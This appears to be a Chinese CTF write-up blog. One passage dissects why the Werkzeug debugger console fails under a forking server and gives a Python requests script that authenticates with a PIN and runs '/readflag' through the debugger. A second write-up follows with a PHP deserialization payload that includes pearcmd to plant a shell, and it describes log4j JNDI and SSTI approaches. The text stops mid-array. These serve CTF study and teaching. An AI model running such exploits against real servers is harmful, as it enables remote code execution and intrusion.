                response <span class="token operator">=</span> self<span class="token punctuation">.</span>log_pin_request<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
            <span class="token keyword">elif</span> <span class="token punctuation">(</span>
                self<span class="token punctuation">.</span>evalex
                <span class="token operator">and</span> cmd <span class="token keyword">is</span> <span class="token operator">not</span> None
                <span class="token operator">and</span> frame <span class="token keyword">is</span> <span class="token operator">not</span> None
                <span class="token operator">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret
                <span class="token operator">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>execute_command<span class="token punctuation">(</span>request<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> frame<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">elif</span> <span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>evalex
            <span class="token operator">and</span> self<span class="token punctuation">.</span>console_path <span class="token keyword">is</span> <span class="token operator">not</span> None
            <span class="token operator">and</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> self<span class="token punctuation">.</span>console_path
        <span class="token punctuation">)</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> self<span class="token punctuation">.</span>display_console<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
</code></pre>
<p>可以看到，需要传入一个<code>__debugger__=yes</code>或访问的路径为console路径（默认为&#x2F;console）方可触发debug流程，cmd中的resource选项用于加载debug界面对应的一些前端文件，js，css，png之类的（我跟了一下没有目录穿越呜呜），提交pin进行验证时cmd为pinauth，printpin路由似乎是请求debug页面时自动发出的，为的是在后端直接把pin打印出来方便调试</p>
<p>cmd不为如上值时尝试执行命令，若仍不满足则使用默认response处理结果，而默认情况下<code>response=self.debug_application</code>，为该函数<br>该函数负责处理全部请求并在产生错误时记录错误数据</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">debug_application</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterator<span class="token punctuation">[</span>bytes<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Run the application and conserve the traceback frames."""</span>
        app_iter <span class="token operator">=</span> None
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            app_iter <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
            <span class="token keyword">yield</span> <span class="token keyword">from</span> app_iter
            <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>

            tb <span class="token operator">=</span> DebugTraceback<span class="token punctuation">(</span>e<span class="token punctuation">,</span> skip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> hide<span class="token operator">=</span><span class="token operator">not</span> self<span class="token punctuation">.</span>show_hidden_frames<span class="token punctuation">)</span>

            <span class="token keyword">for</span> frame <span class="token keyword">in</span> tb<span class="token punctuation">.</span>all_frames<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span>id<span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> frame

            is_trusted <span class="token operator">=</span> bool<span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>
            html <span class="token operator">=</span> tb<span class="token punctuation">.</span>render_debugger_html<span class="token punctuation">(</span>
                evalex<span class="token operator">=</span>self<span class="token punctuation">.</span>evalex<span class="token punctuation">,</span>
                secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span>
                evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">yield</span> <span class="token keyword">from</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                <span class="token comment" spellcheck="true"># if we end up here there has been output but an error</span>
                <span class="token comment" spellcheck="true"># occurred.  in that situation we can do nothing fancy any</span>
                <span class="token comment" spellcheck="true"># more, better log something into the error log and fall</span>
                <span class="token comment" spellcheck="true"># back gracefully.</span>
                environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>
                    <span class="token string">"Debugging middleware caught exception in streamed "</span>
                    <span class="token string">"response at a point where response headers were already "</span>
                    <span class="token string">"sent.\n"</span>
                <span class="token punctuation">)</span>

            environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tb<span class="token punctuation">.</span>render_traceback_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p><code>self.app(environ, start_response)</code>会处理当前请求，若处理中发生了异常，则会将异常对应的frame进行记录并写入self.frames</p>
<p>在用户请求触发错误的页面时，在该题中如<code>note_id=1</code>，会因为没有传入debugger&#x3D;&#x3D;yes直接进入到debug_application函数中，在<code>self.app(environ, start_response)</code>完成请求的处理，而该请求本身会触发报错，因此会将报错的frame写入对应的frame中。接着我们在debug页面的console传入cmd，就能满足</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">elif</span> <span class="token punctuation">(</span>
    self<span class="token punctuation">.</span>evalex
    <span class="token operator">and</span> cmd <span class="token keyword">is</span> <span class="token operator">not</span> None
    <span class="token operator">and</span> frame <span class="token keyword">is</span> <span class="token operator">not</span> None
    <span class="token operator">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret
    <span class="token operator">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span>
</code></pre>
<p>这里的secret感觉像是个nonce一类的东西，是前端上的一个值，check_pin_trust就是验证pin是不是正确的</p>
<p>理论上就能进入到命令执行，而实际上我们打的时候会在debug页面再次出发一次报错，输出一轮和debug页面一样的东西，整的大家都很无语</p>
<p>调试结果如下，访问错误路径诱发报错后</p>
<p><img src="/images/%E6%98%9FCTFwp/image-20220419210508778.png" alt="image-20220419210508778"></p>
<p>而当我们开始执行命令时却变成了这样</p>
<p><img src="/images/%E6%98%9FCTFwp/image-20220419210555322.png" alt="image-20220419210555322"></p>
<p>此时frame为空使得判断跳出，再次进入debug_application函数，又进行处理并抛出异常，也就是我们见到的执行命令套娃抛出异常</p>
<p>（说起来这里我其实是没法区分它们是不是多个不同进程的，因为地址怎么是一样的呢。。。）但是多进程确实是最合理的解释，因为也没有别的地方有相关读写代码了，之前写了后续没有别的写却变成了空，多进程是最合理的解释。</p>
<p>这里还有一个很愚蠢的问题，既然我的请求已经变成了一个debug的请求，那么为什么debug请求处理得到的报错还是和SQL注入的报错一样呢？是因为请求debug页面的请求是<code>/view?__debugger__=yes....</code>，还是请求在view路由下，而后面一大堆的buff因为frame为空都没用了，还是走view的路由，然后因为没有提供id得到的是查不到结果的TypeError，如果当note_id为空时进行额外处理，就会得到一个截然不同的结果</p>
<p>简单的魔改代码</p>
<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">)</span>
@login_required
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    note_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"note_id"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>
    <span class="token keyword">if</span> note_id <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"id is None"</span>
    sql <span class="token operator">=</span> f<span class="token string">"select * from notes where note_id='{note_id}'"</span> 
    <span class="token keyword">print</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    result <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"multi"</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'title'</span><span class="token punctuation">:</span> result<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token string">'text'</span><span class="token punctuation">:</span> result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'note.html'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
</code></pre>
<p>得到了更为魔幻的结果</p>
<p><img src="/images/%E6%98%9FCTFwp/image-20220419212915761.png" alt="image-20220419212915761"></p>
<p>解决第一个小问题</p>
<h4 id="console同样失效"><a href="#console同样失效" class="headerlink" title="console同样失效"></a>console同样失效</h4><p>如果说在debug页面失效是因为需要对应的frame还原上下文环境，werkzeug还提供了一个专门的console路由独立的执行命令，而该路由在执行时会疯狂会写404 not found，也给我整的很无语（偶尔能用，成功率相较debug页面高很多，我当初先乱按了两下命令执行成功了，然后准备读flag的时候就疯狂404了。。。）</p>
<p>先看看执行console路由发生什么，首先在call中直接进display_console，该函数中将self.frame[0]进行了赋值，为<code>_ConsoleFrame</code>，然后在console界面输入命令会发送一个frm值为0的请求</p>
<p>（本地按了几次都没失败，差点以为复现不了了，然后关了重开一个tab请求时app的frame就是空的了。。。）<br>还是在相同的call函数中，由于frame为空又进入到debug_application进行正常请求的处理，而这次请求的路由是<code>/console</code>，由于题目没有定义console路由，所以就究极404了</p>
<p>至此，多进程下werkzeug的debug失效问题完全得到解答</p>
<h4 id="多进程证明"><a href="#多进程证明" class="headerlink" title="多进程证明"></a>多进程证明</h4><p>最后还是找了找到底是在哪多进程的<br>从app.run处往下找，位于<code>werkzeug/serving.py</code>的make_server函数，此处通过区分processes创建不同的server</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">if</span> threaded<span class="token punctuation">:</span>
        <span class="token keyword">return</span> ThreadedWSGIServer<span class="token punctuation">(</span>
            host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> app<span class="token punctuation">,</span> request_handler<span class="token punctuation">,</span> passthrough_errors<span class="token punctuation">,</span> ssl_context<span class="token punctuation">,</span> fd<span class="token operator">=</span>fd
        <span class="token punctuation">)</span>

    <span class="token keyword">if</span> processes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ForkingWSGIServer<span class="token punctuation">(</span>
            host<span class="token punctuation">,</span>
            port<span class="token punctuation">,</span>
            app<span class="token punctuation">,</span>
            processes<span class="token punctuation">,</span>
            request_handler<span class="token punctuation">,</span>
            passthrough_errors<span class="token punctuation">,</span>
            ssl_context<span class="token punctuation">,</span>
            fd<span class="token operator">=</span>fd<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
</code></pre>
<p>当processes大于1时，创建的是forking server。名字已经很明显了嗷。<br>然后找到dispatcher处，大致应该是socketserver.py的serve_forever函数？（好像这个玩意是个python自带库？）</p>
<p>步入到process_request函数，上来就是一句os.fork，直接对不同的请求fork一个子进程，完美的解释了出现多进程的原因<br>在socketserver.py的process_request和flask&#x2F;app.py的full_dispatch_request函数下面打两个断点就能比较清楚的看懂了</p>
<p>（但是按照这个理论的话应该手打就不会成功了啊？可能这些进程也在一定程度上进行了复用？这题框架过于复杂搞不懂了捏，不过在调试的时候看到它也会保持几个子进程常驻，也许是那些进程在某些情况下会被复用？）<br>如果是一个keep alive的长连接的话，就不会出现多次fork，fork一次的进程就会处理整个会话</p>
<pre class=" language-python"><code class="language-python">        <span class="token keyword">def</span> <span class="token function">process_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> client_address<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token triple-quoted-string string">"""Fork a new subprocess to process the request."""</span>
            pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> pid<span class="token punctuation">:</span>
                <span class="token comment" spellcheck="true"># Parent process</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>active_children <span class="token keyword">is</span> None<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>active_children <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>active_children<span class="token punctuation">.</span>add<span class="token punctuation">(</span>pid<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>close_request<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
                <span class="token keyword">return</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token comment" spellcheck="true"># Child process.</span>
                <span class="token comment" spellcheck="true"># This must never return, hence os._exit()!</span>
                status <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>finish_request<span class="token punctuation">(</span>request<span class="token punctuation">,</span> client_address<span class="token punctuation">)</span>
                    status <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>handle_error<span class="token punctuation">(</span>request<span class="token punctuation">,</span> client_address<span class="token punctuation">)</span>
                <span class="token keyword">finally</span><span class="token punctuation">:</span>
                    <span class="token keyword">try</span><span class="token punctuation">:</span>
                        self<span class="token punctuation">.</span>shutdown_request<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
                    <span class="token keyword">finally</span><span class="token punctuation">:</span>
                        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span>status<span class="token punctuation">)</span>
</code></pre>
<p>算是基本搞清楚了。。。真不会</p>
<h3 id="多进程下debug执行命令"><a href="#多进程下debug执行命令" class="headerlink" title="多进程下debug执行命令"></a>多进程下debug执行命令</h3><p>既然如此，难道多进程就不能执行命令了吗。（当然可以，不然这个题大家怎么做出来的呢？）比如碰运气，使得两次访问都在同一个worker进程下不就成功了吗？</p>
<p>当然，WJH师傅也提出了一个更为稳定的方案，只要保持tcp链接不断开，就能保持会话是同一个worker进行。<br>使用python requests的session即可<br>debug页面实际上是前后端分离的，幸好关键内容一开始就有，而不是后来渲染出来的。发出去的请求通过抓包和分析后端均可得出，因此可以写一个简单的脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re


url <span class="token operator">=</span> <span class="token string">"http://www.z3ratu1.cn:5002/"</span>
pin <span class="token operator">=</span> <span class="token string">"916-092-422"</span>
cmd <span class="token operator">=</span> <span class="token string">"import os;os.popen('/readflag').read()"</span>

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">)</span>
csrf_token <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="([a-zA-Z0-9.\\-_])+?">'</span><span class="token punctuation">,</span>
                       res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"z33"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">,</span> <span class="token string">"csrf_token"</span><span class="token punctuation">:</span> csrf_token<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"login!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"note_id"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
frame <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'&lt;div class="frame" id="frame-([0-9]+?)">'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'SECRET = "([A-Za-z0-9]+?)";'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"__debugger__"</span><span class="token punctuation">:</span> <span class="token string">"yes"</span><span class="token punctuation">,</span> <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"pinauth"</span><span class="token punctuation">,</span> <span class="token string">"pin"</span><span class="token punctuation">:</span> pin<span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">:</span> s<span class="token punctuation">}</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"__debugger__"</span><span class="token punctuation">:</span> <span class="token string">"yes"</span><span class="token punctuation">,</span> <span class="token string">"cmd"</span><span class="token punctuation">:</span> cmd<span class="token punctuation">,</span> <span class="token string">"frm"</span><span class="token punctuation">:</span> frame<span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">:</span> s<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>frameid的值可以简单的抓包之后靠猜，也可以翻一下debugger.js，里面有写<code>const frameID = frames[i].id.substring(6);</code></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>主要是搭环境。。。以前没试着调docker里的远程，这回试了一下</p>
<h4 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h4><p>由于这个环境还有一个mysql，手搭有点麻烦，就着docker直接远程调<br>然后docker远程调试没怎么用过，照着网上的教程稍微搭一下<br>首先docker里面也得开一个ssh服务。并且原先的dockerfile中是直接把代码部署好并运行的，这里需要我们连上去之后再上传代码运行，所以需要简单的魔改一下dockerfile<br>大概就是加这些东西，可以把原来部署的代码删了，但是依赖还是得下，然后把原来运行python的命令删掉（不删抢端口，否则好像跑两个也无所谓）</p>
<pre class=" language-dockerfile"><code class="language-dockerfile">RUN apt-get install -y openssh-server openssh-client \
    && echo root:complex_password | chpasswd \
    && echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
    && mkdir /run/sshd

CMD ["/usr/sbin/sshd", "-D"]
</code></pre>
<p>主要的坑是这里怎么启动sshd，手动exec不够优雅，想集成进dockerfile里，以及还需要手动创建一个<code>/run/sshd</code>目录<br>一开始想用systemctl，结果docker里面用不了，systemctl需要pid为1的进程是systemd才能用，docker的pid为1的进程就是docker启动命令的那个进程，显然不行。可以通过给容器privileged来解决，显然也不够优雅。<br>然后百度的结果是用service命令或者init.d启动，但是docker必须有一个前台进程在跑，跑完docker也就退了，而上述方法实际上只是去调用启动脚本，启动脚本跑完退出就会导致docker在启动完成后直接退出。。。可以非常不优雅的加tail或者sleep等命令完成，但是感觉还是很愚蠢。。。（说起来是不是可以直接在RUN那里直接启动来着。。。）</p>
<p>后来还搜了一下systemctl，init.d和service的区别，老版本的linux使用init进程作为1号进程，并用其管理其他进程，后来新整出来了一个更好的守护进程，称之为systemd。init.d下对应的文件为对应程序的启动脚本，service是SysVInit也就是init进程配套的进程管理命令，而systemctl则是对应新的systemd的命令，但实际上为了向后兼容systemd启动的系统也是可以用上述命令的</p>
<p><a href="https://askubuntu.com/questions/911525/difference-between-systemctl-init-d-and-service">Difference between systemctl init.d and service</a></p>
<p>然后rmb神仙和我说你直接启动sshd不就完了。。。。因为我的智力条件你也知道.jpg。期间搜到了一个不相干但确实学到了点其他知识的文章<br><a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">CMD 容器启动命令</a></p>
<p>ssh服务正常连上去按照网上教程走即可</p>
<h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>。。。这个真的是纯傻逼问题。。。<br>就是以前调试的时候，在断点停下来之后就不知道怎么让他继续运行了，只能疯狂step out之类的跳出，或者找到最外层代码直接运行到光标处。。。我一直觉得应该有一个让他直接继续运行的功能，但是今天才发现。。。除了上方的一排step键，左边的几个键也是有作用的，其中一个就是continue。。。</p>
<p><img src="/images/%E6%98%9FCTFwp/image-20220419220911233.png" alt="image-20220419220911233"></p>
<h4 id="python生成器"><a href="#python生成器" class="headerlink" title="python生成器"></a>python生成器</h4><p>虽然提到了在call函数中会调用response对应的函数，也就是这里的debug_application，但直接调试时在最后一句step into却会直接返回到上一层。但是在外层处理数据的for循环中却可以step into该函数。这里是因为debug_application中使用了yield关键字，使其成为了一个生成器，进行调用时并未真正执行，而是产生一个生成器，所以直接step into是进不去的。<br>返回的生成器需要在被调用next时才会触发，并且每次运行到yield处返回，下次调用next时从yield处开始<br>而for循环中自动调用next<br>写一个破烂例子</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> i


f <span class="token operator">=</span> fun<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
</code></pre>
<p>此处fun(5)只是生成了一个生成器对象，此处step into是不会进入fun函数内部的，反而是在for循环中step into即可<br>这里具体的还是yield from，是一个更高级的语法捏。简单的说就是yield from的对象本身就是一个迭代器，能简化语法。复杂的说就是这个操作还能透明进行读写错误处理什么的高级玩意。。。不会了</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnhub2022春季赛 wp</title>
    <url>/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B%20wp.html</url>
    <content><![CDATA[<h1 id="pwnhub2022春季赛-wp"><a href="#pwnhub2022春季赛-wp" class="headerlink" title="pwnhub2022春季赛 wp"></a>pwnhub2022春季赛 wp</h1><p>菜捏，本来还说努努力恰个钱，结果大家都是套皮究极联队。搞了两天经典纪念品，taxi了</p>
<p>几个人小作坊式的恰钱计划还是打不过联队捏。好烦哦<br>题目整体难度不是很大。但是那个传奇实在是有点技术盲区<br>最后除了null究极碾压全场之外，剩下几个队都只差一点点。多出一个题就恰饱饱了呜呜。据说null还去mrctf大杀四方，人多就是好啊呜呜</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezpdf"><a href="#ezpdf" class="headerlink" title="ezpdf"></a>ezpdf</h3><p>pdfbox+log4j2<br>jdk版本8u181随便打jndi<br>百度搜索可得，复制粘贴打通<br><a href="https://github.com/eelyvy/log4jshell-pdf">https://github.com/eelyvy/log4jshell-pdf</a><br>按照说明把&#x2F;size后面的数字改成payload，marshal开一个ldap refer server一键打通</p>
<p>第一天搜索能力有限想着自己找，用tabby之类的，结果tabby究极出bug，现在找原因。。</p>
<h3 id="esay-cms"><a href="#esay-cms" class="headerlink" title="esay cms"></a>esay cms</h3><p>mysql处rouge mysql读文件，读文件后发现testtool存在直接的反序列化点，反序列化的结果会直接带上()动态执行，故可以通过动态调用数组的方式来调用类方法，审计代码发现route类的getView方法可以通过改变route类的class值来实现任意php文件包含，而环境里存在pearcmd，故直接包含pearcmd写一个shell，再包含这个shel即可</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">route</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$toolVar</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token variable">$mode</span> <span class="token operator">=</span> <span class="token string">'index'</span><span class="token punctuation">;</span>
    <span class="token shell-comment comment">#protected $class = </span><span class="token string">'../../../../../../../../../usr/local/lib/php/pearcmd'</span><span class="token punctuation">;</span>
    <span class="token shell-comment comment">#protected $class = </span><span class="token string">'../../../../../../../../../var/www/html/index'</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'../../../../../../../../../tmp/shell'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">route</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'getView'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>rmb神仙用go写的rouge mysql好稳的捏</p>
<h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby flask"></a>baby flask</h3><p>显然的ssti点，但是由于缓存的存在即使复写模板也不会再次渲染。简单debug找到cache定义，LRUcache默认容量400<br>写个破烂一直访问create创建500个模板然后前面一百个任意ssti<br>复制粘贴一个payload打通</p>
<p>简单的说，web的题都挺水的。。。</p>
<p>然后我全知全能lgw秒杀接下来的绝大多数题目，由于汇总了wp就一起贴一下</p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="letsgo"><a href="#letsgo" class="headerlink" title="letsgo"></a>letsgo</h3><pre class=" language-python"><code class="language-python">res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x4F</span><span class="token 